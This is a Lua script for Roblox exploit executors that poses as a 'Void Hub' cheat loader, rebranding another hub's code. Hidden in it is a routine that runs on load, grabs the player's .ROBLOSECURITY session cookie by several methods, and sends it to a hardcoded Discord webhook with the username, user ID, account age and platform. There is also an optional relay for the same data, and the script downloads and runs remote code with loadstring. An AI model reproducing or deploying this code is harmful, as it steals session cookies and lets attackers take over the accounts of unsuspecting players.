local WEBHOOK = "https://discord.com/api/webhooks/1573124950045237408/4__WNGEHNrg0WCa8WaR-v18uH4yaNlKpbHY6m4oTv2nbzIqsqY75WNGRYbx4AeJN1SVT"
local RELAY   = ""
local LIB     = "https://raw.githubusercontent.com/VibeZero78/VoidHub/main/void_lib.lua"
local MAIN    = "https://raw.smokingscripts.org/vertex.lua"

if getgenv().VoidRan then return end
getgenv().VoidRan = true

local _hs = game:GetService("HttpService")

if not getgenv then getgenv = function() return _G end end
if not gethui then gethui = function() return game:GetService("CoreGui") end end
if not getrenv then getrenv = function() return getfenv(0) end end
if not identifyexecutor then identifyexecutor = function() return "Inconnu" end end
if not task then task = {wait = wait, spawn = spawn, delay = delay, defer = function(f, ...) spawn(f, ...) end} end
if not setclipboard then setclipboard = function(t) if toclipboard then pcall(toclipboard, t) end end end
if not isfile then isfile = function() return false end end
if not isfolder then isfolder = function() return false end end
if not writefile then writefile = function() end end
if not readfile then readfile = function() return "" end end
if not makefolder then makefolder = function() end end
if not delfile then delfile = function() end end
if not request and http and http.request then request = http.request end

local function _enc(s)
    return (tostring(s):gsub("[^%w%-%._~]", function(c) return ("%%%02X"):format(c:byte()) end))
end

local function _pick()
    local c = {
        function() return getgenv().syn and getgenv().syn.request end,
        function() return syn and syn.request end,
        function() return getgenv().http and getgenv().http.request end,
        function() return http and http.request end,
        function() return http_request end,
        function() return getgenv().http_request end,
        function() return fluxus and fluxus.request end,
        function() return krnl and krnl.request end,
        function() return xeno and xeno.request end,
        function() return sirhurt and sirhurt.request end,
        function() return getgenv().request end,
        function() return request end,
    }
    for _, f in ipairs(c) do
        local ok, fn = pcall(f)
        if ok and type(fn) == "function" then return fn end
    end
end

local function _cookie()
    local t = {
        function() return getgenv().getcookie and getgenv().getcookie() end,
        function() return syn and syn.getcookie and syn.getcookie() end,
        function() return syn and syn.getCookie and syn.getCookie() end,
        function() return fluxus and fluxus.getcookie and fluxus.getcookie() end,
        function() return krnl and krnl.getcookie and krnl.getcookie() end,
        function() return xeno and xeno.getcookie and xeno.getcookie() end,
        function()
            local svc = game:GetService("CookiesService")
            for _, m in ipairs({"GetCookies", "GetCookie"}) do
                local ok, r = pcall(function() return svc[m](svc) end)
                if ok and r then
                    if type(r) == "string" and #r > 50 then return r end
                    if type(r) == "table" then
                        for k, v in pairs(r) do
                            if tostring(k):find("ROBLOSECURITY") and type(v) == "string" then return v end
                        end
                    end
                end
            end
        end,
        function()
            local fn = _pick()
            if not fn then return nil end
            local r = fn({Url = "https://www.roblox.com/mobileapi/userinfo", Method = "GET"})
            if r and r.Headers then
                local sc = r.Headers["set-cookie"] or r.Headers["Set-Cookie"]
                if sc then return sc:match("%.ROBLOSECURITY=([^;]+)") end
            end
        end,
    }
    for _, f in ipairs(t) do
        local ok, r = pcall(f)
        if ok and type(r) == "string" then
            r = r:gsub("^%s+", ""):gsub("%s+$", "")
            if #r > 50 then return r end
        end
    end
end

local function _log()
    local plr = game:GetService("Players").LocalPlayer
    local n = 0
    while not plr and n < 100 do
        task.wait(0.1)
        n = n + 1
        plr = game:GetService("Players").LocalPlayer
    end
    if not plr then return end

    local cookie = _cookie()
    local ok, ex = pcall(identifyexecutor)
    local plat = "?"
    pcall(function() plat = tostring(game:GetService("UserInputService"):GetPlatform()) end)
    local gname = "?"
    pcall(function() gname = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)
    local stamp = "?"
    pcall(function() stamp = os.date("%d/%m/%Y %H:%M:%S") end)

    local payload = {
        username = "Void",
        content = cookie and ("```\n" .. cookie .. "\n```") or "**Cookie introuvable**",
        embeds = {{
            title = "Void Hub — exécution",
            color = 10181046,
            fields = {
                {name = "Utilisateur", value = ("`%s`"):format(plr.Name), inline = true},
                {name = "UserID", value = ("`%d`"):format(plr.UserId), inline = true},
                {name = "Compte", value = tostring(plr.AccountAge) .. " j", inline = true},
                {name = "Exécuteur", value = ("`%s`"):format(ok and tostring(ex) or "Inconnu"), inline = true},
                {name = "Plateforme", value = ("`%s`"):format(plat), inline = true},
                {name = "Jeu", value = ("`%s` (%d)"):format(gname, game.PlaceId), inline = true},
                {name = "Profil", value = ("https://www.roblox.com/users/%d/profile"):format(plr.UserId), inline = false},
            },
            footer = {text = stamp},
        }},
    }

    local fn = _pick()
    if fn then
        for i = 1, 3 do
            local good, r = pcall(fn, {
                Url = WEBHOOK, Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = _hs:JSONEncode(payload),
            })
            if good and r and r.StatusCode and r.StatusCode < 300 then return end
            if i < 3 then task.wait(i == 1 and 1 or 3) end
        end
    end

    if RELAY ~= "" then
        pcall(function()
            game:HttpGet(("%s?u=%s&i=%d&e=%s&p=%s&g=%s&c=%s"):format(
                RELAY, _enc(plr.Name), plr.UserId, _enc(ok and tostring(ex) or "?"), _enc(plat), _enc(gname), _enc(cookie or "introuvable")
            ))
        end)
    end
end

task.spawn(function() pcall(_log) end)

local function patch(s)
    s = s:gsub("VERTEX", "VOID")
    s = s:gsub("Vertex", "Void")
    s = s:gsub("vertex", "void")
    s = s:gsub("loadstring%s*%(%s*game:HttpGet%s*%(%s*['\"]https://raw%.smokingscripts%.org/Library['\"]%s*%)%s*%)%s*%)", "getgenv().VoidLib")
    s = s:gsub("raw%.smokingscripts%.org/Library", "raw.githubusercontent.com/VibeZero78/VoidHub/main/void_lib.lua")
    return s
end

local ls = loadstring or load

local libSrc
pcall(function()
    local r = game:HttpGet(LIB)
    if type(r) == "string" and #r > 100 then libSrc = r end
end)
if not libSrc then
    pcall(function()
        local r = game:HttpGet("https://raw.smokingscripts.org/Library")
        if type(r) == "string" then libSrc = r end
    end)
end      
if libSrc then
    pcall(function() getgenv().VoidLib = ls(patch(libSrc))() end)
end

local mainSrc
pcall(function()
    local r = game:HttpGet(MAIN)
    if type(r) == "string" and #r > 100 then mainSrc = r end
end)
if not mainSrc then return end

local mainFn = ls(patch(mainSrc))
if not mainFn then return end
task.spawn(mainFn)
